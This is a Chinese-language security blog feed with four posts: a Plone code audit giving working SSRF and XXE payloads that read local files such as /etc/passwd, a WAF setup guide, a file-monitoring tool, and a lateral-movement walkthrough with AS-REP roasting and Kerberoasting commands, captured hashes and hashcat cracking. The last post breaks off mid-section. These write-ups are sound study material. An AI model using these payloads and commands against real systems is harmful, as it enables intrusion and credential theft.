<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2020-11-18T01:35:28.516Z</updated>
  <id>/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计--Plone</title>
    <link href="/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Plone/"/>
    <id>/2020/11/代码审计-Plone/</id>
    <published>2020-11-18T01:32:02.000Z</published>
    <updated>2020-11-18T01:35:28.516Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Plone"><a href="#Plone" class="headerlink" title="Plone"></a>Plone</h2><p>Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这个查看起来查找对应功能实在是费劲。</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><code>plone.app.event-3.2.7-py3.6.egg\plone\app\event\ical\importer.py</code></p><pre><code>@button.buttonAndHandler(u&#39;Save and Import&#39;)    def handleSaveImport(self, action):        data, errors = self.extractData()        if errors:            return False        self.save_data(data)        ical_file = data[&#39;ical_file&#39;]        ical_url = data[&#39;ical_url&#39;]        event_type = data[&#39;event_type&#39;]        sync_strategy = data[&#39;sync_strategy&#39;]        if ical_file or ical_url:            if ical_file:                # File upload is not saved in settings                ical_resource = ical_file.data                ical_import_from = ical_file.filename            else:                ical_resource = urllib.request.urlopen(ical_url).read()                ical_import_from = ical_url            import_metadata = ical_import(                self.context,                ics_resource=ical_resource,                event_type=event_type,                sync_strategy=sync_strategy,            )</code></pre><p>如上所述，在读取参数<code>ical_url</code>时，根据程序设置是导入该事件的<code>icalendar</code>资源文件，但对如何读取资源文件没有限制，可以直接使用urllib包进行读取和返回</p><p>在Members功能下的<code>Action</code>中选择<code>Enable icalendar import</code>后，配置<code>Icalendar URL</code>参数。</p><p>参数：<code>http://127.0.0.1:22</code>，执行<code>Save and Import</code>。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109094919974.png" alt="image-20201109094919974"></p><p>urllib还支持文件协议，因此也可以用于文件读取</p><p>参数: <code>file:///proc/self/environ</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109100807462.png" alt="image-20201109100807462"></p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\browser\records.py</code></p><pre><code>def import_registry(self):        try:            fi = self.request.form[&#39;file&#39;]            body = fi.read()        except (AttributeError, KeyError):            messages = IStatusMessage(self.request)            messages.add(u&quot;Must provide XML file&quot;, type=u&quot;error&quot;)            body = None        if body is not None:            importer = RegistryImporter(self.context, FakeEnv())            try:                importer.importDocument(body)            except XMLSyntaxError:                messages = IStatusMessage(self.request)                messages.add(u&quot;Must provide valid XML file&quot;, type=u&quot;error&quot;)        return self.request.response.redirect(self.context.absolute_url())</code></pre><p>注意<code>importDocument</code>方法，该方法在lxml.etree下调用该方法</p><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\exportimport\handler.py</code></p><pre><code>class RegistryImporter(object):    &quot;&quot;&quot;Helper classt to import a registry file    &quot;&quot;&quot;    LOGGER_ID = &#39;plone.app.registry&#39;    def __init__(self, context, environ):        self.context = context        self.environ = environ        self.logger = environ.getLogger(self.LOGGER_ID)    def importDocument(self, document):        tree = etree.fromstring(document)        if self.environ.shouldPurge():            self.context.records.clear()        i18n_domain = tree.attrib.get(ns(&#39;domain&#39;, I18N_NAMESPACE))        if i18n_domain:            parseinfo.i18n_domain = i18n_domain        for node in tree:            if not isinstance(node.tag, str):                continue            condition = node.attrib.get(&#39;condition&#39;, None)            if condition and not evaluateCondition(condition):                continue            if node.tag.lower() == &#39;record&#39;:                self.importRecord(node)            elif node.tag.lower() == &#39;records&#39;:                self.importRecords(node)        parseinfo.i18n_domain = None</code></pre><p>此方法是此XXE的原因。 在网站设置<code>Site Setup</code>下的<code>Configuration Registry</code>中导出合适的XML文件。 在这里，选择了<code>plone.thumb_scale_table.xml</code>前缀文件。</p><p>参数 POC：</p><pre><code>&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;&lt;registry&gt;  &lt;records interface=&quot;Products.CMFPlone.interfaces.controlpanel.ISiteSchema&quot; prefix=&quot;plone&quot;&gt;    &lt;value key=&quot;thumb_scale_table&quot;&gt;&amp;title;&lt;/value&gt;  &lt;/records&gt;&lt;/registry&gt;</code></pre><p>执行后，您可以在错误报告中看到已解析的XML实体。<img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109142113406.png" alt="image-20201109142113406"></p><h3 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE-2"></a>XXE-2</h3><p><code>plone.app.dexterity-2.6.5-py3.6.egg\plone\app\dexterity\browser\modeleditor.py</code></p><pre><code>class AjaxSaveHandler(BrowserView):    &quot;&quot;&quot;Handle AJAX save posts.    &quot;&quot;&quot;    def __call__(self):        &quot;&quot;&quot;Handle AJAX save post.        &quot;&quot;&quot;        if not authorized(self.context, self.request):            raise Unauthorized        source = self.request.form.get(&#39;source&#39;)        if source:            # Is it valid XML?            try:                root = etree.fromstring(source)            except etree.XMLSyntaxError as e:                return json.dumps({                    &#39;success&#39;: False,                    &#39;message&#39;: &#39;XMLSyntaxError: {0}&#39;.format(                        safe_unicode(e.args[0])                    )                })            # a little more sanity checking, look at first two element levels            if root.tag != NAMESPACE + &#39;model&#39;:                return json.dumps({                    &#39;success&#39;: False,                    &#39;message&#39;: _(u&quot;Error: root tag must be &#39;model&#39;&quot;)                })            for element in root.getchildren():                if element.tag != NAMESPACE + &#39;schema&#39;:                    return json.dumps({                        &#39;success&#39;: False,                        &#39;message&#39;: _(                            u&quot;Error: all model elements must be &#39;schema&#39;&quot;                        )                    })            # can supermodel parse it?            # This is mainly good for catching bad dotted names.            try:                plone.supermodel.loadString(source, policy=u&#39;dexterity&#39;)            except SupermodelParseError as e:                message = e.args[0].replace(&#39;\n  File &quot;&lt;unknown&gt;&quot;&#39;, &#39;&#39;)                return json.dumps({                    &#39;success&#39;: False,                    &#39;message&#39;: u&#39;SuperModelParseError: {0}&#39;.format(message)                })</code></pre><p>上面的代码使用lxml库，但是直接解析xml中的外部参数。 结果，在功能 <code>Dexterity Content Types</code>下选择<code>custom content types</code>，然后单击进入。 <code>fields</code>标签下的<code>Edit XML Field Model</code>可以直接编写xml代码。</p><p>参数 POC：</p><pre><code>&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;&lt;model xmlns:i18n=&quot;http://xml.zope.org/namespaces/i18n&quot; xmlns:marshal=&quot;http://namespaces.plone.org/supermodel/marshal&quot; xmlns:form=&quot;http://namespaces.plone.org/supermodel/form&quot; xmlns:security=&quot;http://namespaces.plone.org/supermodel/security&quot; xmlns:users=&quot;http://namespaces.plone.org/supermodel/users&quot; xmlns:lingua=&quot;http://namespaces.plone.org/supermodel/lingua&quot; xmlns=&quot;http://namespaces.plone.org/supermodel/schema&quot;&gt; &amp;title;&lt;schema/&gt;&lt;/model&gt;</code></pre><p>因为程序代码中似乎存在问题，所以无法添加XML声明文件，但是打开的默认声明文件具有添加的声明文件。 需要删除。 保存参数，并在返回后单击此处查看它们。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201110100900815.png" alt="image-20201110100900815"></p><p>问题相对利用条件较高，需要管理员权限，其后官方推出了更新版本5.2.3：<a href="https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt" target="_blank" rel="noopener">https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Plone&quot;&gt;&lt;a href=&quot;#Plone&quot; class=&quot;headerlink&quot; title=&quot;Plone&quot;&gt;&lt;/a&gt;Plone&lt;/h2&gt;&lt;p&gt;Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>开源WAF搭建</title>
    <link href="/2020/09/%E5%BC%80%E6%BA%90WAF%E6%90%AD%E5%BB%BA/"/>
    <id>/2020/09/开源WAF搭建/</id>
    <published>2020-09-17T07:42:09.000Z</published>
    <updated>2020-09-17T07:42:29.531Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ModSecurity"><a href="#ModSecurity" class="headerlink" title="ModSecurity"></a>ModSecurity</h3><p>在Ubuntu和Nginx上安装，nginx版本为1.14.0。</p><h4 id="安装需要包"><a href="#安装需要包" class="headerlink" title="安装需要包"></a>安装需要包</h4><pre><code>apt-get install -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev</code></pre><h4 id="下载编译ModSecurity-3-0源代码"><a href="#下载编译ModSecurity-3-0源代码" class="headerlink" title="下载编译ModSecurity 3.0源代码"></a>下载编译ModSecurity 3.0源代码</h4><pre><code>git clone --depth 1 -b v3/master --single-branch https://github.com/SpiderLabs/ModSecurity</code></pre><p>进入目录运行编译</p><pre><code>./build.shgit submodule initgit submodule update./configuremakemake install</code></pre><p>如果出现<code>fatal: No names found, cannot describe anything.</code>，是可以忽略的。</p><h4 id="ModSecurity连接器"><a href="#ModSecurity连接器" class="headerlink" title="ModSecurity连接器"></a>ModSecurity连接器</h4><p>下载连接器代码</p><pre><code>git clone --depth 1 https://github.com/SpiderLabs/ModSecurity-nginx.git</code></pre><p>根据已安装的nginx版本安装需要的nginx原代码</p><pre><code>wget http://nginx.org/download/nginx-1.14.0.tar.gztar zxvf nginx-1.14.0.tar.gz</code></pre><p>需要把连接器编译为动态模块到nginx中，到nginx目录下，其中的编译命令根据<code>nginx -V</code>来决定。</p><pre><code>./configure --with-compat --add-dynamic-module=../ModSecurity-nginxmake modulesmkdir /etc/nginx/modulescp objs/ngx_http_modsecurity_module.so /etc/nginx/modules/</code></pre><p>PS：运行<code>nginx -t</code>测试nginx运行，如果出现报错ModSecurity二进制文件不匹配，则可能是nginx版本验证不匹配，那就需要源码编译安装nginx，同时把ModSecurity一起编译。</p><h4 id="加载nginx动态模块"><a href="#加载nginx动态模块" class="headerlink" title="加载nginx动态模块"></a>加载nginx动态模块</h4><p>编译完成后的动态模块需要到配置文件中启动加载，修改配置文件<code>/etc/nginx/nginx.conf</code>中</p><pre><code>load_module /etc/nginx/modules/ngx_http_modsecurity_module.so;</code></pre><h4 id="启用和测试规则"><a href="#启用和测试规则" class="headerlink" title="启用和测试规则"></a>启用和测试规则</h4><p>安装Spiderlabs的规则</p><pre><code>mkdir /etc/nginx/modsecwget -P /etc/nginx/modsec/ https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommendedmv /etc/nginx/modsec/modsecurity.conf-recommended /etc/nginx/modsec/modsecurity.conf</code></pre><p>把ModSecurity中的unicode.mapping文件复制到以上目录</p><pre><code>cp ModSecurity/unicode.mapping /etc/nginx/modsec</code></pre><p>修改配置文件，其中配置部分被注释，需要安需要启用。</p><pre><code>SecRuleEngine DetectionOnly  #仅检测恶意流量，改为on为丢弃恶意流量</code></pre><p>添加owasp的规则，在nginx下创建目录</p><pre><code>mkdir owasp-modsecurity-crscd owasp-modsecurity-crswget https://github.com/coreruleset/coreruleset/archive/v3.3.0.tar.gzmv crs-setup.conf.example crs-setup.confmv rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.confmv rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf</code></pre><p>在modsec中修改modsecurity.conf，添加配置文件，同时把rules目录下的配置文件添加进去</p><pre><code>Include /etc/nginx/modsec/owasp-modsecurity-crs/coreruleset-3.3.0/crs-setup.confInclude /etc/nginx/modsec/owasp-modsecurity-crs/coreruleset-3.3.0/rules/*.conf</code></pre><p>在nginx配置文件中添加此配置</p><pre><code>vi sites-enabled/defaultserver {    listen 80;    modsecurity on;    modsecurity_rules_file /etc/nginx/modsec/modsecurity.conf;}</code></pre><p>可以到crs配置文件中找到对应的规则来启用，比如如下启用id为900240的后缀文件检测</p><pre><code>C:\Users\user&gt;curl http://192.168.120.142/admin.db&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx/1.14.0&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>默认情况下会拦截常见的web攻击，比如</p><pre><code>C:\Users\user&gt;curl http://192.168.120.142/admin.php?id=1%20and%201=1&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx/1.14.0&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="配置新的conf文件"><a href="#配置新的conf文件" class="headerlink" title="配置新的conf文件"></a>配置新的conf文件</h4><p>如果默认的规则文件不符合需求，获取由于其他原因需要添加规则。先看一个普通的规则是怎么样的</p><pre><code> SecRule REQUEST_FILENAME &quot;@endsWith /wp-login.php&quot; \     &quot;id:1003,\     phase:2,\     pass,\     nolog,\     ctl:ruleRemoveTargetByTag=OWASP_CRS;ARGS:pwd&quot;</code></pre><p>相当于在wp-login.php页面中，禁用对参数pwd的拦截检查。其中的格式是</p><pre><code>SecRule VARIABLES OPERATOR ACTIONSVARIABLES ：代表HTTP包中的标识项，规定了安全规则针对的对象。OPERATOR：代表操作符，一般用来定义安全规则的匹配条件。ACTIONS：代表响应动作，一般用来定义数据包被规则命中后的响应动作。</code></pre><p>比如，我们打算写一个只允许特定IP访问的路径。这时候需要两条规则来判断，需要<code>chain</code>来连接动作。把它保存到上面crs配置文件路径。重启nginx</p><pre><code>SecRule REQUEST_FILENAME &quot;@endsWith /login.php&quot; \    &quot;id:91002,\    phase:1,\    pass,\    nolog,\    deny,\    chain&quot;    SecRule  REMOTE_ADDR &quot;!@ipMatch 192.168.120.1&quot; \        &quot;t:none&quot;</code></pre><p>配置文档参考：<code>http://www.modsecurity.cn/chm/ConfigurationDirectives.html</code></p><h3 id="VeryNginx"><a href="#VeryNginx" class="headerlink" title="VeryNginx"></a>VeryNginx</h3><p>VeryNginx 基于 <code>lua_nginx_module(openrestry)</code> 开发。 集成在 Nginx 中运行，扩展了 Nginx 本身的功能，并提供了友好的 Web 交互界面。本质上这并不是一个WAF，只是openrestry的界面化。但是可以通过界面化的配置规则来实现waf的功能。</p><p><code>https://github.com/alexazhou/VeryNginx</code></p><h4 id="一键配置"><a href="#一键配置" class="headerlink" title="一键配置"></a>一键配置</h4><p>克隆 VeryNginx 仓库到本地, 然后进入仓库目录，执行以下命令</p><pre><code>python install.py install</code></pre><p>即可一键安装 VeryNginx 和 以及依赖的 OpenResty，可以先修改其中的版本为新版本地址再安装。</p><h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h4><p>手动安装，需要本地的nginx有openrestry，所以先安装。</p><pre><code>apt-get install libreadline-dev libpcre3-dev libssl-dev perlwget https://openresty.org/download/openresty-1.17.8.2.tar.gz./configure -j2make -j2sudo make installexport PATH=/usr/local/openresty/bin:$PATH</code></pre><p>这时候会把openrestry加入快捷命令，如果直接执行openrestry将开启自带的nginx。</p><p>再来安装verynginx</p><pre><code>python install.py install verynginx</code></pre><p>在nginx的配置文件中添加以下规则，需要配置到不同的地方。</p><pre><code>include /opt/verynginx/verynginx/nginx_conf/in_external.conf;   #http外部include /opt/verynginx/verynginx/nginx_conf/in_http_block.conf;  #http内部include /opt/verynginx/verynginx/nginx_conf/in_server_block.conf;  #server内部</code></pre><p>在地址<code>/verynginx/index_zh.html</code>下即可访问到页面。</p><p>默认的账号密码都是<code>verynginx</code> / <code>verynginx</code>。添加规则的方式比modsecurity简单，但自带的规则过于简单，需要自己添加规则。</p><p>已有的规则可以参考：<code>https://github.com/unixhot/waf</code></p><h3 id="JxWaf"><a href="#JxWaf" class="headerlink" title="JxWaf"></a>JxWaf</h3><p><code>https://github.com/jx-sec/jxwaf</code></p><p>jxwaf(锦衣盾)是一款开源WEB应用防火墙，分为客户端和服务端，客户端也是openrestry开发而来。</p><h4 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h4><p>采用私有化部署</p><pre><code>docker run -d -p 80:80 jxwaf/jxwaf-server:latest</code></pre><p>拉取后，访问地址邮箱验证码随便填写，注册账号在全局配置页面获取”api key”和”api password”</p><h4 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h4><pre><code>git clone https://github.com/jx-sec/jxwaf.gitcd jxwafsh install_waf.sh</code></pre><p>在下载的文件内：</p><pre><code>cd toolspython jxwaf_init.py --api_key=xxxx --api_password=xxxx --waf_server=http://192.168.1.1/opt/jxwaf/nginx/sbin/nginx</code></pre><p>在网站管理中添加对应的域名和IP端口</p><h3 id="Janusec"><a href="#Janusec" class="headerlink" title="Janusec"></a>Janusec</h3><p>可多节点布置的应用网关。<code>https://github.com/Janusec/janusec</code></p><pre><code>wget https://www.janusec.com/download/janusec-latest.tar.gztar zxf ./janusec-latest.tar.gzcd janusec-0.9.9./install.sh</code></pre><p>此处选择的是1，主节点。默认安装的路径为 <code>/usr/local/janusec/</code></p><p>由于需要postgresql</p><pre><code>sudo apt-get install postgresql postgresql-clientsudo -i -u postgrescreate user janusec with password &#39;janusec&#39;;create database janusec owner janusec;grant all on database janusec to janusec;\q</code></pre><p>然后编辑 <code>/usr/local/janusec/config.json</code> ，尝试开启waf</p><pre><code>systemctl start janusec</code></pre><p>设置中管理太台监听设置为true，则使用http:9080端口，此处修改为false，直接在目录<code>janusec-admin/</code></p><p>默认用户名：<code>admin</code>，默认口令：<code>J@nusec123</code>。在应用管理中添加IP端口信息即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ModSecurity&quot;&gt;&lt;a href=&quot;#ModSecurity&quot; class=&quot;headerlink&quot; title=&quot;ModSecurity&quot;&gt;&lt;/a&gt;ModSecurity&lt;/h3&gt;&lt;p&gt;在Ubuntu和Nginx上安装，nginx版本为1.14.0。&lt;/
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>基于inotify的Linux文件实时监控扫描</title>
    <link href="/2020/09/%E5%9F%BA%E4%BA%8Einotify%E7%9A%84Linux%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E6%89%AB%E6%8F%8F/"/>
    <id>/2020/09/基于inotify的Linux文件实时监控扫描/</id>
    <published>2020-09-04T09:02:23.000Z</published>
    <updated>2020-09-04T09:02:38.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id="watchfile"><a href="#watchfile" class="headerlink" title="watchfile"></a>watchfile</h2><p>项目地址：<a href="https://github.com/MisakiKata/watchfile" target="_blank" rel="noopener">https://github.com/MisakiKata/watchfile</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>#第三方库pip install pyinotify#使用supervisor来守护进程apt-get install supervisoryum install supervisor</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre><code>#安装完成后需要启动，按需要修改配置文件supervisord -c /etc/supervisor/supervisord.conf#配置文件例子; supervisor config file[unix_http_server]file=/var/run/supervisor.sock   ; (the path to the socket file)chmod=0700                       ; sockef file mode (default 0700)[supervisord]logfile=/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log)pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)childlogdir=/var/log/supervisor            ; (&#39;AUTO&#39; child log dir, default $TEMP); the below section must remain in the config file for RPC; (supervisorctl/web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl=unix:///var/run/supervisor.sock ; use a unix:// URL  for a unix socket; The [include] section can just contain the &quot;files&quot; setting.  This; setting can list multiple files (separated by whitespace or; newlines).  It can also contain wildcards.  The filenames are; interpreted as relative to this file.  Included files *cannot*; include files themselves.[include]files = /data/vscode/watchfile/watchfile.conf    #修改自己的配置文件地址由于调用了河马扫描程序来检测文件，所以大量文件同时变更时，检测会慢，建议系统做大量变更时可以停掉程序。</code></pre><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><pre><code>在config.ini 中修改自己的配置，因为使用多线程来监控多目录，建议使用多目录配置运行 python3 daemon.py来查看输出和测试邮件异常处理查看输出日志的时候，如果出现wd=-1   需要修改 vim /etc/sysctl.conffs.inotify.max_user_watches = 128000    #决定了同时同一用户可以监控的目录数量日志中看到Event Queue Overflowmax_queued_events太小需要调整参数</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;watchfile&quot;&gt;&lt;a href=&quot;#watchfile&quot; class=&quot;headerlink&quot; title=&quot;watchfile&quot;&gt;&lt;/a&gt;watchfile&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/MisakiKat
      
    
    </summary>
    
    
      <category term="shell" scheme="/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透横行移动</title>
    <link href="/2020/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E8%A1%8C%E7%A7%BB%E5%8A%A8/"/>
    <id>/2020/08/内网渗透横行移动/</id>
    <published>2020-08-12T01:03:29.000Z</published>
    <updated>2020-08-12T01:03:29.403Z</updated>
    
    <content type="html"><![CDATA[<p>在进行这些东西之前，至少需要一个可完整交互的shell，默认就已经获得了shell，并且提权到<code>nt authority\system</code> </p><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。如果用户开启了“不使用Kerberos预认证”，攻击者就可以获取到Kerberos AS-REP，然后他就可以离线破解这个凭证了。</p><p>首先需要知道有哪些用户，这里使用kerbrute来枚举，需要其开启了88端口</p><p>需要使用如下的项目：<a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener">https://github.com/ropnop/kerbrute</a></p><pre><code>kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 20</code></pre><p>如果获得如下的输出，则代表枚举到用户名</p><pre><code>2020/08/06 17:22:21 &gt;  Using KDC(s):2020/08/06 17:22:21 &gt;   spookysec.local:882020/08/06 17:22:22 &gt;  [+] VALID USERNAME:       james@spookysec.local2020/08/06 17:22:26 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local2020/08/06 17:22:34 &gt;  [+] VALID USERNAME:       James@spookysec.local2020/08/06 17:22:36 &gt;  [+] VALID USERNAME:       robin@spookysec.local2020/08/06 17:23:04 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local2020/08/06 17:23:18 &gt;  [+] VALID USERNAME:       administrator@spookysec.local2020/08/06 17:23:51 &gt;  [+] VALID USERNAME:       backup@spookysec.local</code></pre><p>使用GetNPUsers来获取用户kerberos票证，如果没有开启选项，则会报一个没有设置的错误</p><pre><code>GetNPUsers.py spookysec.local/jamesλ GetNPUsers.py spookysec.local/james -no-passImpacket v0.9.20 - Copyright 2019 SecureAuth Corporation[*] Getting TGT for james[-] User james doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set</code></pre><p>如果开启的话会显示当前票据</p><pre><code>λ GetNPUsers.py spookysec.local/svc-admin -no-passImpacket v0.9.20 - Copyright 2019 SecureAuth Corporation[*] Getting TGT for svc-admin$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a5c2252aa6fd31021c6b73ddf78790a0$4ca233e07269de808a3036ca9f1db6e9a611001682f8dfa433b8409ca87fcd5d604546cfdac46f2cbc86f60455f4779c839ede069e49fd0889edca6017952a5ea26c104ed985aa1c6b82b0f57171c340e743c9f8fe4aef06ace0dd800704024f8808effcd9c602322f4e73e4331914cc22ee2b74d7130ff2bf1f7f89b90d63428d65f655d522fe39adbb24bb0cc815f1e5fab5cefdd5fd4caa775b6712ee3ce99a1f9bb50598a7f77eddd133fdb6c70980154337078128854684bd017df86e0b9ba4769c3db16e7fa4fe702a2622029f6850c82eff7c690096d78f9694978600f5a00beb41cfae1c13b24c6b88cabb6d1f08</code></pre><p>再去利用hashcat爆破密码</p><pre><code>hashcat -m 18200 hashfile wordlist --force   #hashfile是保存hash的文件名</code></pre><p>如果不想先获取用户，可以直接利用GetNPUsers来检索，就是速度有点慢</p><pre><code>GetNPUsers.py spookysec.local/  -usersfile userlist.txt -dc-ip 10.10.50.231</code></pre><p>获取到的结果会显示如下，可以获取到的用户直接显示，不可以的显示没有设置。</p><pre><code>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User James doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:59726561a02eb64b0a108c63f1078db3$7866b1dce6fee28d5033ba1f7446e80f03d18649fed3f300aeb55b5fa7f1cdb09d5dcc7259d722e757ddaa305f64ca51b8f05d2740dff233aa3741b944913c2e96bd6767b2cb209f013cfa6b106c6a5a38c48a1fc48e695bfbdf74f21010689e0abd0cfc0a4f2565f08b7a6a4f3645fdee4dd1fedc0b0088cc0fade7e55ec58593c184deecfef267db0ab613f3661a665ce850284c8cfcd033cde5960959331a5fac4cd5f4eb537969614328c5740498fca8cf34d882f4465e78b85302b3b6304042f08e8fb7ecd386b1da5798d6189fe1056f5dc74be490492443b36d2c743090bad3a8970ee8b4b4e6c75eb11ee53fbbf1</code></pre><h3 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h3><p>利用的项目：<a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></p><p>在Kerberos与TGS通信完成时会返回一张ST，ST使用Server端的密码进行加密。</p><p>首先查找注册的SPN。SPN：服务主体名称，服务实例的唯一标识。</p><pre><code>setspn -Q */*    #查看当前域内的所有SPNsetspn -T delay.com -Q */*  #查看delay.com域内的SPN</code></pre><p>其中格式：&lt;服务类型&gt;/&lt;机器名&gt;:&lt;端口&gt;</p><pre><code>CN=DC,OU=Domain Controllers,DC=de1ay,DC=com    Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.de1ay.com    ldap/DC.de1ay.com/ForestDnsZones.de1ay.com    ldap/DC.de1ay.com/DomainDnsZones.de1ay.com    TERMSRV/DC         TERMSRV/DC.de1ay.com    DNS/DC.de1ay.com    GC/DC.de1ay.com/de1ay.com    RestrictedKrbHost/DC.de1ay.com    RestrictedKrbHost/DC    RPC/3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com    HOST/DC/DE1AY    HOST/DC.de1ay.com/DE1AY    HOST/DC    HOST/DC.de1ay.com    HOST/DC.de1ay.com/de1ay.com    E3514235-4B06-11D1-AB04-00C04FC2DCD2/3f0c65bc-e5d1-472f-a826-bca6be17b380/de1ay.com    ldap/DC/DE1AY    ldap/3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com    ldap/DC.de1ay.com/DE1AY    ldap/DC    ldap/DC.de1ay.com    ldap/DC.de1ay.com/de1ay.comCN=krbtgt,CN=Users,DC=de1ay,DC=com    kadmin/changepwCN=PC,CN=Computers,DC=de1ay,DC=com    TERMSRV/PC    TERMSRV/PC.de1ay.com    RestrictedKrbHost/PC    HOST/PC    RestrictedKrbHost/PC.de1ay.com    HOST/PC.de1ay.comCN=WEB,CN=Computers,DC=de1ay,DC=com    WSMAN/WEB    WSMAN/WEB.de1ay.com    TERMSRV/WEB    TERMSRV/WEB.de1ay.com    RestrictedKrbHost/WEB    HOST/WEB    RestrictedKrbHost/WEB.de1ay.com    HOST/WEB.de1ay.com发现存在 SPN! </code></pre><p>但在爆破的时候需要查看加密方式是否为RC4加密，如上的SPN采用的是AES加密。使用<code>klist</code>查看</p><pre><code>#3&gt;     客户端: DE1AY @ DE1AY.COM        服务器: kadmin/changepw @ DE1AY.COM        Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96        票证标志 0x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize        开始时间: 8/6/2020 